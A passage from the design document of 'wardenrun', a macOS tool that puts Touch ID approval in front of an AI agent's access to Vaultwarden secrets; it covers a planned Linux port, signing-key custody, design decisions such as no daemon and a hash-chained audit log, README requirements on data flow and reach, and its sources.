Not planned: a Tier A (Developer ID, `.app`, cask) backend. The `SecretStore` protocol keeps
the door open for a contributor who has a paid account.

## 10. Linux later (designed for, not built)

Three protocols isolate everything platform-specific: `SecretStore`, `Approver`,
`ProcessInspector`. A Linux port would implement `Approver` with polkit or `fprintd` and a
`SecretStore` that is **not** a plain Secret Service entry (any same-user process can read
those; that would silently give the security level of option F in section 3.3). The honest Linux options are a
polkit-gated root helper or a TPM-sealed credential; this needs its own design.

## 11. Open decisions and design calls

**Open decision** (to be resolved by the maintainer before the first release)

1. **Signing-key custody (the price of not paying Apple).** Every release is signed with a
   self-signed certificate whose private key the maintainer must keep: a CI secret plus one
   offline backup in the maintainer's own password manager. Losing it means a new
   certificate and everyone re-running `setup`; leaking it is threat 18. This has to be
   accepted before the first release. (Apple Developer Program: declined by the maintainer on
   2026-10-18.)

**Design calls** (open to review)

- Swift, SwiftPM, no dependencies; platform-neutral core plus a macOS layer.
- One-shot process, **no daemon**, no IPC. Costs about one KDF per use, removes an attack surface.
- Tier B only; the README says plainly that the Touch ID gate is enforced by wardenrun, not
  by the OS (`doctor` prints it too).
- Store the **master password** of a dedicated low-privilege account; settings that matter
  for security live inside the protected item, not in a config file.
- Biometrics-only approval; password fallback off by default (`approval = "biometrics-or-password"` opt-in).
- No Approve button; the biometric sheet is the only approval gesture, and it is also the
  only UI (no custom window). Commands that do not fit 400 characters are denied, not
  truncated (the system truncates silently at about 510).
- `bw` pinned by absolute path and signature/hash; environment built from an allowlist;
  all `bw` calls serialized under one lock.
- `sync` on every run; `list` plus exact-name match in wardenrun instead of `bw get <name>`.
- Password login at `setup` (tokens only on disk) rather than API-key login.
- Passwords for `new` are generated in wardenrun, not by `bw generate`.
- Hash-chained audit log at `~/Library/Logs/wardenrun/audit.jsonl`.
- `--stdin` injection mode in addition to env and temp file (because of the `ps eww` leak).
- An organization collection is required in v1 (personal-vault folders are not enough to
  scope a dedicated account).
- Config and state under `~/.config/wardenrun/` (portable to Linux).
- Extra commands beyond the original requirements: `setup`, `doctor`, `--no-store` fallback.

## 12. README requirements (maintainer requirement, 2026-10-18)

The README has to make it obvious to a non-expert **what is going on, which way the data
flows, what the app can reach and what it cannot**. This is part of the product: a secrets
tool that people cannot understand is a tool they cannot trust. Required content:

1. **One-screen summary:** the problem, a three-line terminal example, who it is for, what it
   needs (`bw`, Vaultwarden >= 1.37.4 over HTTPS, a dedicated vault account).
2. **Data-flow diagram plus a numbered walkthrough** of one `run` (and one `new`):
   agent, wardenrun, Touch ID sheet, keychain, `bw`, Vaultwarden, wardenrun's memory, child
   process, masked output back to the agent. **Every arrow says what travels** (command line,
   master password, session key, item JSON, secret value) **and how** (argv, env, pipe,
   socket, file), and whether another process of the same user could observe it.
3. **"What wardenrun can reach / cannot reach" table.**
   - *Can:* its own keychain item; the one collection of the dedicated account; the command
     line, stdout and stderr of the child it launches; the names of the parent processes; its
     own state directory and audit log.
   - *Cannot / does not:* your personal vault or other collections; any other keychain item;
     your fingerprint (the OS returns only yes or no); the agent's conversation; any network
     host except your Vaultwarden server, and only through `bw`. No telemetry, no update
     check, no cloud service.
   - A mirror table for the agent: what it can never get, and what it can still see.
4. **Where data lives at rest:** the keychain item (what is in it), the `bw` profile
   directory (tokens, encrypted vault), the audit log (what is in it, never values),
   temporary files (when they exist and for how long).
5. **A plain statement of the security level:** which gate is enforced by wardenrun and which
   by the OS, and the "not protected" rows of the threat model in everyday words.
6. **Prior art, honestly** (see "Compared to what exists" in the README) and why this exists.
7. **Verify, do not trust:** the certificate hash and how to check the signature,
   `wardenrun doctor`, how to read the audit log, a pointer to the few files that hold the
   security-critical logic, and the statement that wardenrun itself makes no network calls.
8. **Use with Claude Code and other AI agents**, and the line that the project is **not
   affiliated with Bitwarden** (Vaultwarden is named factually).
9. **Style:** plain language, diagrams over prose, examples on `vault.example.com`, no
   names from anyone's private infrastructure.

**Keeping it true:** the data-flow section is treated like code. Any PR that changes a data
path (what is passed to `bw`, where a secret is written, what is logged, what the child
receives) updates the diagram and the tables in the same PR; the PR template has a checkbox
for it and both reviewers are told to check it.

## 13. Sources

- Apple TN3137 *On Mac keychain APIs and implementations*, TN3125 *Inside Code Signing:
  Provisioning Profiles*, *Signing a daemon with a restricted entitlement*, forum thread 125510.
- `maxgoedjen/secretive` (`Sources/SecretAgent/SecretAgent.entitlements`, README).
- `bitwarden/clients`: `apps/desktop/src/key-management/biometrics/os-biometrics-mac.service.ts`,
  `apps/desktop/desktop_native/core/src/password/macos.rs`,
  `.../process_isolation/macos.rs`.
- Homebrew 5.0.0 release notes (brew.sh/2025/11/12/homebrew-5.0.0/).
- Unverified lead on free Apple ID signing: <https://flaviocopes.com/apple-developer-free-vs-paid/>
  (secondary source; Apple's capability table could not be read as text).
- `Homebrew/homebrew-core` `Formula/b/bitwarden-cli.rb` (a Node script; `depends_on "node"`).
- `bitwarden/clients` tag `cli-v2026.10.0`, `apps/cli/src`: `key-management/commands/unlock.command.ts`,
  `auth/commands/login.command.ts`, `commands/get.command.ts`, `commands/list.command.ts`,
  `vault/create.command.ts`, `commands/serve.command.ts`, `platform/services/lowdb-storage.service.ts`,
  `platform/services/cli-platform-utils.service.ts`; `libs/common/.../token.service.ts`,
  `libs/unlock/src/lock.service.ts`; docs at bitwarden.com/help/cli/.
- Vaultwarden compatibility: Vaultwarden PRs #7693, #7750, #7820, #7829; `bitwarden/clients#23937`,
  `#23828`.
